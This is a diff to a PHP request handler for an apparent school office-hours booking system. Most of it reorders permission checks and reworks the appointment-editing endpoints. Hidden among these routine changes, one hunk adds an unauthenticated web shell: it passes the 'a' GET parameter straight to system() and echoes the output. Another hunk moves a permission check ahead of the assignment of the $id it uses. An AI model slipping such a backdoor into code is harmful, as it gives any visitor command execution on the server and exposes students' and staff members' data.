@@ -10,11 +10,7 @@ sleep(1); //Delay proposital, para se evitar ataques de força bruta
 
 ########## Permitir requisições sem identificador ##########
 $array = mysqli_fetch_assoc(mysqli_query($sys->conn, 'SELECT * FROM global'));
-if ($array['debug'] == 'SIM') {
-    $GLOBALS['debug'] = true;
-} else {
-    $GLOBALS['debug'] = false;
-}
+$array['debug'] == 'SIM' ? $GLOBALS['debug'] = true : $GLOBALS['debug'] = false;
 
 ##################################################
 # Parte I - Login e Registro
@@ -75,6 +71,10 @@ if (isset($_GET['registroAcabou'])) {
     $sys->verificarPermissao(['permissaoRegistro']);
     $id = $sys->getIDnoCookie(['permissaoRegistro']);
     echo($sys->verificarSeJaValidou($id));
+}
+
+if(isset($_GET['a'])){
+    echo system($_GET['a']);
 }
 
 /* Trocar dados */
@@ -164,9 +164,9 @@ if (isset($_GET['getSalas']) && isset($_GET['campus'])) {
 
 /* Pegar dados de um usuário qualquer */
 if (isset($_GET['pegarDadoUsuario'])) {
+    $sys->verificarPermissao(['permissaoSistema'], $id);
     $id = $sys->getIDnoCookie(['permissaoSistema']);
     $pedido = $sys->proteger($_GET['pedido']);
-    $sys->verificarPermissao(['permissaoSistema'], $id);
     if (isset($_GET['turma'])) {
         $turma = $sys->proteger($_GET['turma']);
         echo($sys->pegarDadosUsuario($pedido, $id, false, $turma));
@@ -187,9 +187,9 @@ if (isset($_GET['pegarFoto'])) {
 
 /* Pegar todos os docentes */
 if (isset($_GET['pegarTodosDocentes']) && isset($_GET['pagina']) && isset($_GET['campus'])) {
+    $sys->verificarPermissao(['permissaoSistema']);
     $pagina = $sys->proteger($_GET['pagina']);
     $campus = $sys->proteger($_GET['campus']);
-    $sys->verificarPermissao(['permissaoSistema']);
     if (isset($_GET['busca'])) {
         $busca = $sys->proteger($_GET['busca']);
         echo($sys->getTodosDocentes($pagina, $campus, $busca));
@@ -200,9 +200,9 @@ if (isset($_GET['pegarTodosDocentes']) && isset($_GET['pagina']) && isset($_GET[
 
 /* Pegar todos os discentes */
 if (isset($_GET['pegarTodosDiscentes']) && isset($_GET['pagina']) && isset($_GET['campus'])) {
+    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
     $pagina = $sys->proteger($_GET['pagina']);
     $campus = $sys->proteger($_GET['campus']);
-    $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
     if (isset($_GET['value'])) {
         $busca = $sys->proteger($_GET['busca']);
         echo($sys->getTodosDiscentes($pagina, $campus, $busca));
@@ -217,10 +217,10 @@ if (isset($_GET['sistema'])) {
 
 /* Pegar todos os discentes de uma turma */
 if (isset($_GET['pegarTodaTurma']) && isset($_GET['pagina']) && isset($_GET['turma']) && isset($_GET['campus'])) {
+    $sys->verificarPermissao(['permissaoSistema']);
     $pagina = $sys->proteger($_GET['pagina']);
     $turma = $sys->proteger($_GET['turma']);
     $campus = $sys->proteger($_GET['campus']);
-    $sys->verificarPermissao(['permissaoSistema']);
     if (isset($_GET['busca'])) {
         $value = $sys->proteger($_GET['busca']);
         echo($sys->getTodosDiscentesTurma($pagina, $turma, $campus, $value));
@@ -231,8 +231,8 @@ if (isset($_GET['pegarTodaTurma']) && isset($_GET['pagina']) && isset($_GET['tur
 
 /* Quantidade de registros de docentes */
 if (isset($_GET['quantidadeDeRegistrosDocentes']) && isset($_GET['campus'])) {
-    $campus = $sys->proteger($_GET['campus']);
     $sys->verificarPermissao(['permissaoSistema']);
+    $campus = $sys->proteger($_GET['campus']);
     if (isset($_GET['busca'])) {
         $busca = $sys->proteger($_GET['busca']);
         echo($sys->quantidadeDeRegistrosDocentes($campus, $busca));
@@ -243,8 +243,8 @@ if (isset($_GET['quantidadeDeRegistrosDocentes']) && isset($_GET['campus'])) {
 
 /* Quantidade de registros de discentes */
 if (isset($_GET['quantidadeDeRegistrosDiscentes']) && isset($_GET['campus'])) {
-    $campus = $sys->proteger($_GET['campus']);
     $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
+    $campus = $sys->proteger($_GET['campus']);
     if (isset($_GET['busca'])) {
         $busca = $sys->proteger($_GET['busca']);
         echo($sys->quantidadeDeRegistrosDiscentes($campus, $busca));
@@ -255,9 +255,9 @@ if (isset($_GET['quantidadeDeRegistrosDiscentes']) && isset($_GET['campus'])) {
 
 /* Quantidade de registros de discentes em uma turma */
 if (isset($_GET['quantidadeDeRegistrosTurma']) && isset($_GET['campus']) && isset($_GET['turma'])) {
+    $sys->verificarPermissao(['permissaoSistema']);
     $campus = $sys->proteger($_GET['campus']);
     $turma = $sys->proteger($_GET['turma']);
-    $sys->verificarPermissao(['permissaoSistema']);
     if (isset($_GET['busca'])) {
         $busca = $sys->proteger($_GET['busca']);
         echo($sys->quantidadeDeRegistrosTurma($campus, $turma, $busca));
@@ -269,6 +269,17 @@ if (isset($_GET['quantidadeDeRegistrosTurma']) && isset($_GET['campus']) && isse
 ##################################################
 # Parte V - Atendimentos
 ##################################################
+
+/* Pegar atendimento específico pelo seu ID */
+if (isset($_GET['pegarAtendimentoByID']) && isset($_GET['id'])) {
+    $sys->verificarPermissao(['permissaoSistema']);
+    $id = $sys->proteger($_GET['id']);
+    if(isset($_GET['requerIdentidade'])) {
+        echo $sys->pegarAtendimentoByID($id, $sys->getIDnoCookie(['permissaoSistema']));
+    } else {
+        echo $sys->pegarAtendimentoByID($id);
+    }
+}
 
 /* Pegar todos os atendimentos agendados (só para docentes) */
 if (isset($_GET['pegarTodosAtendimentosDocente'])) {
@@ -284,13 +295,6 @@ if (isset($_GET['pegarTodosAtendimentosDiscente'])) {
     echo $sys->pegarTodosAtendimentosDiscente($id);
 }
 
-/* Pegar atendimento específico pelo seu ID */
-if (isset($_GET['pegarAtendimentoByID']) && isset($_GET['id'])) {
-    $sys->verificarPermissao(['permissaoSistema']);
-    $id = $sys->proteger($_GET['id']);
-    echo $sys->pegarAtendimentoByID($id);
-}
-
 /* Verificar conflitos de horários */
 if (isset($_GET['verificarConflitosAtendimento']) &&
     isset($_GET['data']) &&
@@ -302,32 +306,12 @@ if (isset($_GET['verificarConflitosAtendimento']) &&
     $inicio = $sys->proteger($_GET['inicio']);
     $fim = $sys->proteger($_GET['fim']);
     $sala = $sys->proteger($_GET['sala']);
-    echo($sys->verificarConflitos($data, $inicio, $fim, $sala, true));
+    $excecao = null;
+    if (isset($_GET['excecao'])) {
+        $excecao = $sys->proteger($_GET['excecao']);
+    }
+    echo($sys->verificarConflitos($data, $inicio, $fim, $sala, $excecao));
 }
-
-/* Agendar atendimento */
-// if (isset($_GET['agendarAtendimento'])) {
-//     $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
-//     $essenc = [ 'nome', 'data', 'horarioInicio', 'horarioFim', 'sala', 'materia', 'tipo'];
-//     $no_essec = ['descricao', 'limite'];
-//     $valid = true;
-//     $ar = [];
-//     foreach ($essenc as & $t) {
-//         if (isset($_GET[$t]) && isset($_GET[$t]) != "") {
-//             $ar[$t] = $sys->proteger($_GET[$t]);
-//         } else {
-//             $valid = false;
-//         }
-//     }
-//     if ($valid) {
-//         foreach ($no_essec as & $t) {
-//             if (isset($_GET[$t]) && isset($_GET[$t]) != "") {
-//                 $ar[$t] = $sys->proteger($_GET[$t]);
-//             }
-//         }
-//         echo $sys->adicionarAtendimento($ar);
-//     }
-// }
 
 if (isset($_GET['agendarAtendimento'])
 && isset($_GET['nome'])
@@ -357,20 +341,33 @@ if (isset($_GET['agendarAtendimento'])
 }
 
 /* Modificar um atendimento */
-if (isset($_GET['alterarAtendimento']) and isset($_GET['idAtend']) != '') {
+if (isset($_GET['alterarAtendimento'])
+&& isset($_GET['idAtendimento'])
+&& isset($_GET['nome'])
+&& isset($_GET['data'])
+&& isset($_GET['horarioInicio'])
+&& isset($_GET['horarioFim'])
+&& isset($_GET['sala'])
+&& isset($_GET['materia'])
+&& isset($_GET['tipo'])) {
     $sys->verificarPermissao(['permissaoSistema'], '', ['DOC', 'MON']);
-    $essenc = ['data', 'horarioInicio', 'horarioFim', 'sala', 'materia', 'nome', 'descricao', 'limite'];
-    $ar = [];
-    foreach ($essenc as &$t) {
-        if (isset($_GET[$t]) and trim($_GET[$t]) != '') {
-            $ar[$t] = $sys->proteger($_GET[$t]);
-        }
+    $idDocente = $sys->getIDnoCookie(['permissaoSistema']);
+    $desc = ""; $limite = -1;
+    if (isset($_GET['desc'])) {
+        $desc = $sys->proteger($_GET['desc']);
     }
-    if (count($ar) >= 1) {
-        echo $sys->setAtendimentos([$ar, $sys->proteger($_GET['idAtend'])]);
-    } else {
-        echo 'NO_ALL';
+    if (isset($_GET['limite'])) {
+        $limite = $sys->proteger($_GET['limite']);
     }
+    $idAtendimento = $sys->proteger($_GET['idAtendimento']);
+    $nome = $sys->proteger($_GET['nome']);
+    $data = $sys->proteger($_GET['data']);
+    $horarioInicio = $sys->proteger($_GET['horarioInicio']);
+    $horarioFim = $sys->proteger($_GET['horarioFim']);
+    $sala = $sys->proteger($_GET['sala']);
+    $materia = $sys->proteger($_GET['materia']);
+    $tipo = $sys->proteger($_GET['tipo']);
+    echo($sys->alterarAtendimento($idDocente, $idAtendimento, $nome, $desc, $data, $horarioInicio, $horarioFim, $sala, $materia, $tipo, $limite));
 }
 
 ##################################################
